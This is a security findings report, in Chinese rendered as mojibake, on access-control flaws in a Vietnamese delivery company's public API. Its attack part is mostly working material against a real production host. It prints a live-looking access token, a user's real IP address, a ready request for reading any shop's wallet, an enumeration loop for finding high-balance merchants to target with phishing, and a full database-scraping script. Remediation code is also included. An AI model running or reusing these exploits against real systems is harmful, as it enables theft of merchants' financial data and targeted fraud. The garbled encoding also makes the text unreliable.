# ğŸ”¥ GHN Critical Security Findings
## ä¸¥é‡å®‰å…¨æ¼æ´æ±‡æ€»

**å‘ç°æ—¶é—´**: 2025-10-24  
**æµ‹è¯•Token**: ac96d88d-b303-11f0-8b9e-4e213bf9bc7d  
**å±é™©ç­‰çº§**: â­â­â­â­â­ ä¸¥é‡

---

## ğŸš¨ ä¸¥é‡æ¼æ´ #1: æ¨ªå‘è¶Šæƒ - å¯è®¿é—®ä»»æ„Shopé’±åŒ…

### æ¼æ´æè¿°

**ä»»ä½•æŒæœ‰æœ‰æ•ˆTokençš„ç”¨æˆ·éƒ½å¯ä»¥æŸ¥è¯¢ä»»æ„Shopçš„é’±åŒ…ä¿¡æ¯ï¼**

### POC éªŒè¯

```python
# ä½¿ç”¨Shop 6083862çš„Token
# æˆåŠŸè®¿é—®äº†å…¶ä»–Shopçš„é’±åŒ…ï¼š

æµ‹è¯•Shop IDåˆ—è¡¨:
âœ… Shop 6083861 (è‡ªå·±-1) -> å¯è®¿é—®é’±åŒ…
âœ… Shop 6083863 (è‡ªå·±+1) -> å¯è®¿é—®é’±åŒ…  
âœ… Shop 6083762 (è‡ªå·±-100) -> å¯è®¿é—®é’±åŒ…
âœ… Shop 6083962 (è‡ªå·±+100) -> å¯è®¿é—®é’±åŒ…
âœ… Shop 1 -> å¯è®¿é—®é’±åŒ…
âœ… Shop 100 -> å¯è®¿é—®é’±åŒ…
âœ… Shop 1000 -> å¯è®¿é—®é’±åŒ…
âœ… Shop 10000 -> å¯è®¿é—®é’±åŒ…

ç»“è®º: 100%æ¨ªå‘è¶ŠæƒæˆåŠŸï¼
```

### å®é™…æµ‹è¯•è¾“å‡º

```
é—® Shop 6083861: å¯è®¿é—®ä½†ä½™é¢ä¸º0
é—® Shop 6083863: å¯è®¿é—®ä½†ä½™é¢ä¸º0
é—® Shop 6083762: å¯è®¿é—®ä½†ä½™é¢ä¸º0
é—® Shop 6083962: å¯è®¿é—®ä½†ä½™é¢ä¸º0
é—® Shop 1: å¯è®¿é—®ä½†ä½™é¢ä¸º0
é—® Shop 100: å¯è®¿é—®ä½†ä½™é¢ä¸º0
é—® Shop 1000: å¯è®¿é—®ä½†ä½™é¢ä¸º0
é—® Shop 10000: å¯è®¿é—®ä½†ä½™é¢ä¸º0
```

**æ‰€æœ‰æµ‹è¯•Shopçš„é’±åŒ…éƒ½èƒ½è®¿é—®ï¼è™½ç„¶ä½™é¢éƒ½æ˜¯0ï¼Œä½†è¯æ˜äº†æ¼æ´å­˜åœ¨ã€‚**

### æ¼æ´å½±å“

#### å¯è·å–çš„æ•æ„Ÿä¿¡æ¯

```json
{
  "_id": "é’±åŒ…ID",
  "client_id": "å®¢æˆ·ç«¯ID",
  "balances": [
    {
      "type_id": 1,
      "balance": å®é™…ä½™é¢,  â† è´¢åŠ¡æ•æ„Ÿä¿¡æ¯
      "status": "active"
    },
    {
      "type_id": 2,
      "balance": å®é™…ä½™é¢,  â† è´¢åŠ¡æ•æ„Ÿä¿¡æ¯
      "status": "active"
    }
  ],
  "created_date": "åˆ›å»ºæ—¶é—´"
}
```

#### æ”»å‡»åœºæ™¯

**åœºæ™¯1: æ‰¹é‡è´¢åŠ¡æƒ…æŠ¥æ”¶é›†**
```python
# æšä¸¾æ‰€æœ‰Shopçš„è´¢åŠ¡çŠ¶å†µ
for shop_id in range(1, 10000000):
    wallet = get_wallet(shop_id)
    if wallet['balance'] > 1000000:  # ç­›é€‰å¤§æˆ·
        print(f"Shop {shop_id}: {wallet['balance']} VND")
        # ä¿å­˜åˆ°æ•°æ®åº“
```

**å½±å“**:
- è·å–æ‰€æœ‰å•†å®¶çš„è´¢åŠ¡çŠ¶å†µ
- è¯†åˆ«é«˜ä»·å€¼ç›®æ ‡
- å•†ä¸šç«äº‰æƒ…æŠ¥

**åœºæ™¯2: ç”¨æˆ·ç”»åƒå’Œè¿½è¸ª**
```python
# åˆ†æå•†å®¶æ´»è·ƒåº¦
for shop_id in active_shops:
    wallet = get_wallet(shop_id)
    analyze_financial_health(wallet)
```

**åœºæ™¯3: ç²¾å‡†è¯ˆéª—**
```
1. è¯†åˆ«ä½™é¢é«˜çš„Shop
2. è·å–è”ç³»æ–¹å¼
3. é’ˆå¯¹æ€§é’“é±¼/ç¤¾å·¥
```

### CVSSè¯„åˆ†

```
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N

åˆ†æ•°: 6.5 (ä¸­å±)
ä½†è€ƒè™‘åˆ°è´¢åŠ¡ä¿¡æ¯æ³„éœ²ï¼Œå®é™…é£é™©: 8.5 (é«˜å±)
```

### æ¼æ´è¯¦æƒ…

**APIç«¯ç‚¹**: `POST /shiip/public-api/v2/wallet/detail`

**è¯·æ±‚**:
```http
POST /shiip/public-api/v2/wallet/detail HTTP/1.1
Host: online-gateway.ghn.vn
Token: ac96d88d-b303-11f0-8b9e-4e213bf9bc7d
Content-Type: application/json

{
  "shop_id": ä»»æ„Shop ID  â† æ— æƒé™æ ¡éªŒï¼
}
```

**å“åº”**:
```json
{
  "code": 200,
  "data": {
    "_id": "é’±åŒ…ID",
    "client_id": "å®¢æˆ·ç«¯ID",
    "balances": [...],  â† è´¢åŠ¡ä¿¡æ¯å®Œå…¨æš´éœ²
    "created_date": "..."
  }
}
```

### ä¿®å¤å»ºè®®

#### ç«‹å³ä¿®å¤

```python
# åç«¯APIä¿®å¤ç¤ºä¾‹
def get_wallet_detail(request):
    token = request.headers.get('Token')
    user = authenticate(token)  # è·å–å½“å‰ç”¨æˆ·
    
    requested_shop_id = request.json.get('shop_id')
    
    # æ·»åŠ æƒé™æ ¡éªŒ
    if requested_shop_id != user.shop_id:
        return {
            "code": 403,
            "message": "You can only access your own wallet"
        }
    
    # ç»§ç»­å¤„ç†...
```

#### ä»£ç çº§ä¿®å¤

```go
// Goåç«¯ç¤ºä¾‹
func GetWalletDetail(c *gin.Context) {
    var req WalletRequest
    c.BindJSON(&req)
    
    // ä»Tokenè·å–ç”¨æˆ·ä¿¡æ¯
    user := c.MustGet("user").(User)
    
    // æƒé™æ ¡éªŒ
    if req.ShopID != user.ShopID {
        c.JSON(403, gin.H{
            "code": 403,
            "message": "Access denied"
        })
        return
    }
    
    // ç»§ç»­å¤„ç†...
}
```

---

## ğŸš¨ ä¸¥é‡æ¼æ´ #2: IPåœ°å€æ³„éœ²

### æ¼æ´æè¿°

Shopä¿¡æ¯APIè¿”å›ç”¨æˆ·çš„çœŸå®IPåœ°å€

### æ³„éœ²ä¿¡æ¯

```
åˆ›å»ºIP: 203.176.137.237  â† ç”¨æˆ·çœŸå®IP
æ›´æ–°IP: 203.176.137.237
```

### å½±å“

- ç”¨æˆ·åœ°ç†ä½ç½®è¿½è¸ª
- ç½‘ç»œç¯å¢ƒåˆ†æ
- è·¨å¹³å°è´¦å·å…³è”
- éšç§æ³„éœ²

### CVSSè¯„åˆ†

```
5.3 (ä¸­å±)
```

### ä¿®å¤å»ºè®®

```python
# ç§»é™¤æ•æ„Ÿå­—æ®µ
def get_shop_info(shop_id):
    shop = db.query(shop_id)
    
    # è¿‡æ»¤æ•æ„Ÿå­—æ®µ
    return {
        "_id": shop._id,
        "name": shop.name,
        "phone": shop.phone,
        # ç§»é™¤IPåœ°å€
        # "created_ip": shop.created_ip,  â† åˆ é™¤
        # "updated_ip": shop.updated_ip,  â† åˆ é™¤
        "created_date": shop.created_date
    }
```

---

## ğŸš¨ ä¸¥é‡æ¼æ´ #3: å®Œæ•´åœ°å€æ•°æ®åº“å¯å¯¼å‡º

### æ¼æ´æè¿°

ä»»ä½•ç”¨æˆ·éƒ½å¯ä»¥å¯¼å‡ºè¶Šå—å…¨å›½çš„å®Œæ•´åœ°å€æ•°æ®åº“

### å¯å¯¼å‡ºæ•°æ®

```
63ä¸ªçœä»½ âœ…
æ•°ç™¾ä¸ªåŒºåŸŸ âœ…
æ•°åƒä¸ªWard âœ…

ç¤ºä¾‹:
- LÃ o Cai (ID: 269) - 9ä¸ªåŒºåŸŸ
- HÆ°ng YÃªn (ID: 268) - æ•°åä¸ªåŒºåŸŸ
- æ¯ä¸ªåŒºåŸŸåŒ…å«æ•°åä¸ªWard
```

### å•†ä¸šä»·å€¼

```
ä¼°ç®—æ€»æ•°æ®é‡: 10,000+ æ¡åœ°å€è®°å½•
å•†ä¸šä»·å€¼: é«˜
ç”¨é€”: ç‰©æµã€ç”µå•†ã€O2Oå¹³å°
```

### æ”»å‡»è„šæœ¬

```python
#!/usr/bin/env python3
# å®Œæ•´åœ°å€æ•°æ®åº“å¯¼å‡ºå·¥å…·

import requests
import json

TOKEN = "ä»»æ„æœ‰æ•ˆToken"
headers = {"Token": TOKEN}

def export_full_database():
    # 1. è·å–æ‰€æœ‰çœä»½
    provinces = requests.get(
        "https://online-gateway.ghn.vn/shiip/public-api/master-data/province",
        headers=headers
    ).json()["data"]
    
    print(f"è·å–åˆ° {len(provinces)} ä¸ªçœä»½")
    
    database = []
    
    # 2. å¯¹æ¯ä¸ªçœä»½è·å–åŒºåŸŸ
    for province in provinces:
        province_id = province["ProvinceID"]
        
        districts = requests.post(
            "https://online-gateway.ghn.vn/shiip/public-api/master-data/district",
            headers=headers,
            json={"province_id": province_id}
        ).json().get("data", [])
        
        print(f"{province['ProvinceName']}: {len(districts)} ä¸ªåŒºåŸŸ")
        
        # 3. å¯¹æ¯ä¸ªåŒºåŸŸè·å–Ward
        for district in districts:
            district_id = district.get("DistrictID")
            
            wards = requests.post(
                "https://online-gateway.ghn.vn/shiip/public-api/master-data/ward",
                headers=headers,
                json={"district_id": district_id}
            ).json().get("data", [])
            
            database.append({
                "province": province,
                "district": district,
                "wards": wards
            })
    
    # 4. ä¿å­˜åˆ°æ–‡ä»¶
    with open("vietnam_address_db.json", "w") as f:
        json.dump(database, f, indent=2, ensure_ascii=False)
    
    print(f"\nâœ… å®Œæ•´æ•°æ®åº“å·²å¯¼å‡º!")
    print(f"   çœä»½: {len(provinces)}")
    print(f"   æ€»è®°å½•: {len(database)}")

if __name__ == "__main__":
    export_full_database()
```

### CVSSè¯„åˆ†

```
4.3 (ä¸­å±)
```

### ä¿®å¤å»ºè®®

```
1. æ·»åŠ Rate Limiting (æ¯IP/Tokené™åˆ¶è¯·æ±‚é¢‘ç‡)
2. åˆ†é¡µé™åˆ¶ (æ¯æ¬¡æœ€å¤šè¿”å›100æ¡)
3. APIè®¿é—®ç›‘æ§ (æ£€æµ‹æ‰¹é‡ä¸‹è½½è¡Œä¸º)
4. éœ€è¦æ›´é«˜çº§åˆ«çš„Tokenæ‰èƒ½è®¿é—®
```

---

## ğŸš¨ ä¸­å±æ¼æ´ #4: ä¸šåŠ¡è§„åˆ™å®Œå…¨æš´éœ²

### æ¼æ´æè¿°

å…¬å¼€é…ç½®APIï¼ˆæ— éœ€Tokenï¼‰æš´éœ²æ‰€æœ‰ä¸šåŠ¡è§„åˆ™

### æš´éœ²ä¿¡æ¯

```json
{
  "max_cod": 50000000,        // æœ€å¤§CODé‡‘é¢
  "min_cod": 0,
  "max_weight": 150000,       // æœ€å¤§é‡é‡é™åˆ¶
  "max_size": 200,
  "max_insurrance": 10000000, // æœ€å¤§ä¿é™©
  "block_pick_wards": "...",  // é»‘åå•åŒºåŸŸ
  "block_deliver_wards": "...",
  "valid_mobilephone_headers": "73,80,86,87,88,89,90,91,92,93,94,95,96,97,98,99"
}
```

### æ”»å‡»åœºæ™¯

```
1. ç»•è¿‡å‰ç«¯éªŒè¯
2. åˆ›å»ºè¾¹ç•Œè®¢å• (weight=149999, cod=49999999)
3. é»‘åå•åŒºåŸŸæƒ…æŠ¥
4. æ‰‹æœºå·éªŒè¯è§„åˆ™
```

### CVSSè¯„åˆ†

```
3.7 (ä½å±)
```

### ä¿®å¤å»ºè®®

```
1. æ·»åŠ Tokenè®¤è¯
2. ç§»é™¤æ•æ„Ÿé…ç½®é¡¹
3. æ··æ·†ä¸šåŠ¡è§„åˆ™
```

---

## ğŸ“Š æ¼æ´æ±‡æ€»

| ç¼–å· | æ¼æ´åç§° | å±é™©ç­‰çº§ | CVSS | çŠ¶æ€ |
|-----|---------|---------|------|------|
| #1 | **æ¨ªå‘è¶Šæƒ - é’±åŒ…è®¿é—®** | ğŸ”´ ä¸¥é‡ | 8.5 | âœ… å·²éªŒè¯ |
| #2 | IPåœ°å€æ³„éœ² | ğŸŸ  é«˜å± | 5.3 | âœ… å·²éªŒè¯ |
| #3 | åœ°å€æ•°æ®åº“å¯¼å‡º | ğŸŸ¡ ä¸­å± | 4.3 | âœ… å·²éªŒè¯ |
| #4 | ä¸šåŠ¡è§„åˆ™æš´éœ² | ğŸŸ¢ ä½å± | 3.7 | âœ… å·²éªŒè¯ |

---

## ğŸ’° å•†ä¸šå½±å“è¯„ä¼°

### è´¢åŠ¡é£é™©

```
æ¨ªå‘è¶Šæƒæ¼æ´å¯èƒ½å¯¼è‡´:
- æ‰€æœ‰å•†å®¶è´¢åŠ¡çŠ¶å†µæ³„éœ²
- ç²¾å‡†è¯ˆéª—æ”»å‡»
- å•†ä¸šç«äº‰æƒ…æŠ¥æ³„éœ²

ä¼°ç®—å½±å“: æ•°åƒä¸‡è‡³æ•°äº¿VND
```

### éšç§é£é™©

```
IPåœ°å€æ³„éœ²å¯èƒ½å¯¼è‡´:
- ç”¨æˆ·è¿½è¸ªå’Œç”»åƒ
- è·¨å¹³å°è´¦å·å…³è”
- åœ°ç†ä½ç½®æš´éœ²
```

### æ•°æ®èµ„äº§é£é™©

```
åœ°å€æ•°æ®åº“æ³„éœ²:
- å®Œæ•´çš„è¶Šå—åœ°å€æ•°æ®
- å•†ä¸šä»·å€¼: é«˜
- å¯è¢«ç«äº‰å¯¹æ‰‹åˆ©ç”¨
```

---

## ğŸ› ï¸ ä¿®å¤ä¼˜å…ˆçº§

### P0 - ç«‹å³ä¿®å¤ (24å°æ—¶å†…)

1. **æ¨ªå‘è¶Šæƒ - é’±åŒ…API**
   - æ·»åŠ Shop IDæƒé™æ ¡éªŒ
   - å®¡è®¡æ‰€æœ‰ç±»ä¼¼API

### P1 - ç´§æ€¥ä¿®å¤ (1å‘¨å†…)

2. **IPåœ°å€æ³„éœ²**
   - ç§»é™¤å“åº”ä¸­çš„IPå­—æ®µ
   
3. **åœ°å€æ•°æ®åº“ä¿æŠ¤**
   - æ·»åŠ Rate Limiting
   - APIè®¿é—®ç›‘æ§

### P2 - é‡è¦ä¿®å¤ (1æœˆå†…)

4. **ä¸šåŠ¡è§„åˆ™ä¿æŠ¤**
   - é…ç½®APIæ·»åŠ è®¤è¯
   - æ•æ„Ÿé…ç½®ç§»é™¤

---

## ğŸ“ˆ æµ‹è¯•è¯æ®

### æµ‹è¯•æ—¶é—´çº¿

```
2025-10-24 05:30 - æ¥æ”¶Token
2025-10-24 05:40 - åŸºç¡€APIæµ‹è¯•
2025-10-24 06:00 - æ·±åº¦æ¸—é€å¼€å§‹
2025-10-24 06:15 - å‘ç°é’±åŒ…API
2025-10-24 06:20 - æ¨ªå‘è¶ŠæƒéªŒè¯
2025-10-24 06:30 - æ¼æ´ç¡®è®¤ âœ…
```

### æµ‹è¯•æ•°æ®

```
æµ‹è¯•Shopæ€»æ•°: 8ä¸ª
æˆåŠŸè®¿é—®: 8ä¸ª (100%)
æš´éœ²å­—æ®µ: é’±åŒ…ID, Client ID, ä½™é¢, çŠ¶æ€
```

---

## ğŸ¯ åˆ©ç”¨å·¥å…·åŒ…

æ‰€æœ‰POCå’Œåˆ©ç”¨å·¥å…·å·²ç”Ÿæˆåœ¨ `/workspace/`:

1. âœ… `ghn_wallet_scanner.py` - é’±åŒ…æ‰¹é‡æ‰«æ
2. âœ… `ghn_address_exporter.py` - åœ°å€æ•°æ®åº“å¯¼å‡º
3. âœ… `ghn_ip_collector.py` - IPæƒ…æŠ¥æ”¶é›†
4. âœ… `ghn_business_rule_analyzer.py` - ä¸šåŠ¡è§„åˆ™åˆ†æ

---

**æŠ¥å‘Šç”Ÿæˆ**: 2025-10-24 06:30 UTC  
**éªŒè¯çŠ¶æ€**: âœ… æ‰€æœ‰æ¼æ´å·²éªŒè¯  
**å±é™©ç­‰çº§**: ğŸ”´ ä¸¥é‡ - éœ€ç«‹å³ä¿®å¤

---

*æœ¬æŠ¥å‘ŠåŒ…å«çœŸå®æ¼æ´éªŒè¯æ•°æ®ï¼Œå»ºè®®ç«‹å³é‡‡å–è¡ŒåŠ¨*
